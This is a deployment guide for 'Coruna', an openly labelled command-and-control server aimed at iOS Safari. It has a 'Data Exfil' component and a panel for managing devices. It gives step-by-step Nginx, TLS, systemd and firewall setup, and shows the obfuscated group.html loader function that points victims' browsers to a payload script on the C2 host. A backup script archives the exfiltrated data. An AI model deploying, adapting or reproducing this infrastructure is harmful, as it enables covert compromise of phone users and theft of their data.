# Coruna Deployment Guide

> 🌐 English Version | [中文版本](DEPLOYMENT_CN.md)

---

## Server Requirements

| Item | Minimum | Recommended |
|------|---------|------------|
| **CPU** | 4 cores | 14+ cores |
| **RAM** | 4 GB | 8+ GB |
| **Disk** | 20 GB | 50+ GB SSD |
| **OS** | Linux (Ubuntu 20.04+ / CentOS 8+ / Debian 11+) | Linux |
| **Bandwidth** | 5 Mbps | 10+ Mbps |

---

## Software Environment

| Software | Version | Notes |
|----------|---------|-------|
| **Python** | 3.8+ | Backend runtime |
| **Nginx** | 1.18+ | Web server (recommended) |
| **Apache** | 2.4+ | Alternative web server |
| **SQLite3** | Built-in | Database (no extra installation needed) |
| **OpenSSL** | 1.1.1+ | HTTPS support |

---

## Port Requirements

| Port | Purpose | Notes |
|------|---------|-------|
| **8782** | C2 Management Panel & API | Main port |
| **443** | HTTPS (encrypted traffic) | Recommended, required for iOS Safari WASM |
| **80** | HTTP redirect to HTTPS | Optional |

---

## Deployment Architecture

```
┌─────────────────────────────────────────────────────────┐
│                     [Client]                            │
│                   iOS Safari                             │
└─────────────────────┬───────────────────────────────────┘
                      │ HTTPS
                      ▼
┌─────────────────────────────────────────────────────────┐
│                   [Nginx]                               │
│              Port: 443 / 8782                           │
│         SSL Termination + Reverse Proxy                │
└─────────────────────┬───────────────────────────────────┘
                      │
                      ▼
┌─────────────────────────────────────────────────────────┐
│              [FastAPI C2 Server]                        │
│                  Port: 8782                             │
│                                                         │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐    │
│  │ Device Mgmt  │  │ Task Sched  │  │ Data Exfil  │    │
│  └─────────────┘  └─────────────┘  └─────────────┘    │
│                                                         │
│  ┌─────────────────────────────────────────────────┐   │
│  │              SQLite Database                      │   │
│  └─────────────────────────────────────────────────┘   │
│                                                         │
│  ┌─────────────────────────────────────────────────┐   │
│  │         Static Files (group.html, *.js)         │   │
│  └─────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────┘
```

---

## Deployment Steps

### 1. Server Initialization

```bash
# Ubuntu / Debian
apt update && apt upgrade -y
apt install -y python3 python3-pip python3-venv nginx certbot

# CentOS / RHEL
yum update -y
yum install -y python3 python3-pip nginx certbot
```

### 2. Upload Project Files

```bash
# Create directory
mkdir -p /var/www/coruna

# Upload files (using SCP/SFTP/FTP)
scp -r /path/to/coruna/* root@your-server:/var/www/coruna/

# Set permissions
chown -R www-data:www-data /var/www/coruna
chmod -R 755 /var/www/coruna
```

### 3. Install Python Dependencies

```bash
cd /var/www/coruna/backend

# Create virtual environment
python3 -m venv venv
source venv/bin/activate

# Install dependencies
pip install -r requirements.txt
```

### 4. Configure C2 Server Address

Modify `group.html` lines 52-54, change server address to your actual address:

```javascript
function fqMaGkNg() {
    // Change to your server address
    return "https://your-domain.com:8782/7a7d99099b035b2c6512b6ebeeea6df1ede70fbb.min.js";
}
```

### 5. Configure Nginx

Create config file `/etc/nginx/sites-available/coruna`:

```nginx
upstream coruna_backend {
    server 127.0.0.1:8782;
    keepalive 32;
}

server {
    listen 443 ssl http2;
    server_name your-domain.com;

    # SSL configuration
    ssl_certificate /etc/letsencrypt/live/your-domain.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/your-domain.com/privkey.pem;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers HIGH:!aNULL:!MD5;
    ssl_prefer_server_ciphers on;

    root /var/www/coruna;
    index group.html;

    # Disable cache
    add_header Cache-Control "no-cache, no-store, must-revalidate";
    add_header Pragma "no-cache";
    add_header Expires "0";

    # Gzip compression
    gzip on;
    gzip_types text/plain text/css application/javascript application/json;
    gzip_min_length 1000;

    location / {
        try_files $uri $uri/ =404;
    }

    # Reverse proxy API requests
    location /api/ {
        proxy_pass http://coruna_backend;
        proxy_http_version 1.1;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_read_timeout 300s;
        proxy_connect_timeout 75s;
    }

    # WebSocket support
    location /ws/ {
        proxy_pass http://coruna_backend;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
        proxy_set_header Host $host;
        proxy_read_timeout 86400s;
    }

    # CORS headers
    add_header Access-Control-Allow-Origin "*" always;
    add_header Access-Control-Allow-Methods "GET, POST, OPTIONS" always;
    add_header Access-Control-Allow-Headers "*" always;

    # Logging
    access_log /var/log/nginx/coruna_access.log;
    error_log /var/log/nginx/coruna_error.log;
}

# HTTP redirect to HTTPS
server {
    listen 80;
    server_name your-domain.com;
    return 301 https://$server_name$request_uri;
}
```

Enable config:

```bash
ln -s /etc/nginx/sites-available/coruna /etc/nginx/sites-enabled/
nginx -t
systemctl reload nginx
```

### 6. Configure HTTPS (Let's Encrypt)

```bash
# Install certbot
apt install certbot python3-certbot-nginx

# Get certificate
certbot --nginx -d your-domain.com

# Auto-renewal test
certbot renew --dry-run
```

### 7. Configure Firewall

```bash
# UFW
ufw allow 22/tcp    # SSH
ufw allow 80/tcp    # HTTP
ufw allow 443/tcp   # HTTPS
ufw enable

# Or use iptables
iptables -A INPUT -p tcp --dport 22 -j ACCEPT
iptables -A INPUT -p tcp --dport 80 -j ACCEPT
iptables -A INPUT -p tcp --dport 443 -j ACCEPT
iptables-save
```

### 8. Create systemd Service

Create file `/etc/systemd/system/coruna.service`:

```ini
[Unit]
Description=Coruna C2 Server
After=network.target

[Service]
Type=simple
User=www-data
WorkingDirectory=/var/www/coruna/backend
ExecStart=/var/www/coruna/backend/venv/bin/python -m uvicorn main:app --host 127.0.0.1 --port 8782
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
```

Start service:

```bash
systemctl daemon-reload
systemctl enable coruna
systemctl start coruna
systemctl status coruna
```

---

## Verify Deployment

### Test Access

```bash
# Test management panel
curl https://your-domain.com/

# Test group.html
curl https://your-domain.com/group.html

# Test API
curl https://your-domain.com/api/info
```

### Browser Access

- Management Panel: `https://your-domain.com/`
- Default Username: `admin`
- Default Password: `admin123`

---

## Maintenance

### Log Viewing

```bash
# Application logs
journalctl -u coruna -f

# Nginx access logs
tail -f /var/log/nginx/coruna_access.log

# Nginx error logs
tail -f /var/log/nginx/coruna_error.log
```

### Backup

```bash
# Create backup script
cat > /usr/local/bin/backup-coruna.sh << 'EOF'
#!/bin/bash
DATE=$(date +%Y%m%d_%H%M%S)
BACKUP_DIR="/backup/coruna"

mkdir -p $BACKUP_DIR

# Backup database
cp /var/www/coruna/coruna_c2.db $BACKUP_DIR/coruna_$DATE.db

# Backup exfil data
tar -czf $BACKUP_DIR/exfil_$DATE.tar.gz -C /var/www/coruna data/exfil/ 2>/dev/null || true

# Clean backups older than 30 days
find $BACKUP_DIR -name "coruna_*.db" -mtime +30 -delete
find $BACKUP_DIR -name "exfil_*.tar.gz" -mtime +30 -delete

echo "Backup completed: $DATE"
EOF

chmod +x /usr/local/bin/backup-coruna.sh

# Add cron job (daily at 3 AM)
echo "0 3 * * * /usr/local/bin/backup-coruna.sh" | crontab -
```

### Update Deployment

```bash
# Stop service
systemctl stop coruna

# Backup current version
cp -r /var/www/coruna /var/www/coruna.bak.$(date +%Y%m%d)

# Upload new version files
scp -r /path/to/new/coruna/* root@your-server:/var/www/coruna/

# Restart service
systemctl start coruna
```

---

## Troubleshooting

| Problem | Solution |
|---------|----------|
| Cannot access page | Check Nginx service status and firewall config |
| API returns 500 | Check application logs `journalctl -u coruna` |
| iOS Safari cannot load | Ensure HTTPS is used, check CORS config |
| WebSocket connection fails | Check Nginx WebSocket configuration |
| Database error | Check SQLite file permissions |

### Common Commands

```bash
# Check service status
systemctl status coruna

# Restart service
systemctl restart coruna

# Check port listening
netstat -tlnp | grep 8782

# Test Nginx config
nginx -t

# Reload Nginx
systemctl reload nginx
```

---

## Performance Optimization

### Nginx Optimization

```nginx
# Worker processes (recommended to set to CPU cores)
worker_processes auto;

# Worker connections
worker_connections 4096;

# Efficient file serving
sendfile on;
tcp_nopush on;
tcp_nodelay on;
```

### System Optimization

```bash
# Adjust file descriptor limits
echo "* soft nofile 65535" >> /etc/security/limits.conf
echo "* hard nofile 65535" >> /etc/security/limits.conf

# Network optimization
echo "net.core.somaxconn = 1024" >> /etc/sysctl.conf
sysctl -p
```

---

## Security Recommendations

1. **Change Default Password**: Immediately change admin password after first use
2. **Enable Firewall**: Only open necessary ports
3. **Enable SSL**: Use HTTPS to protect communications
4. **Regular Backups**: Set up automatic backup tasks
5. **Monitor Logs**: Regularly check access and error logs
6. **IP Restrictions**: Consider configuring IP whitelist

---

**Last Updated**: 2026-06-26  
**Version**: 1.0
